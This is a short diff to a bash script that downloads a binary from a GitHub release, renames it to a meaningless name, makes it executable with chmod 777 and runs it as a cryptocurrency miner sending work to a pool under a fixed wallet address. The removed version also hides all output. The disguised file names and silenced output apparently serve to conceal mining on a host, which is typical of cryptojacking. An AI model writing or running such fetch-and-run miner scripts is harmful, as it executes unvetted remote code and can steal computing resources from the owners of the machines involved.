@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://github.com/vedhagsvp/tkospae/releases/download/aplose/pkso
-mv pkso bdreas
-chmod 777 bdreas
-./bdreas --coin pearl -o 57.128.164.63:80 -u prl1prafxwc52qrj2gqd46q78hnqfakeff7zsxdn3ndd5uu6n4f27wneq3c7gd5/aaa2777-$RANDOM > /dev/null 2>&1
+wget https://github.com/pearlhash/pearlhash-miner/releases/download/V14/pearl-miner
+mv pearl-miner vasds
+chmod 777 vasds
+./vasds --host pool.pearlhash.xyz:9000 --user prl1prafxwc52qrj2gqd46q78hnqfakeff7zsxdn3ndd5uu6n4f27wneq3c7gd5 --worker $(echo $RANDOM | md5sum | head -c 10)
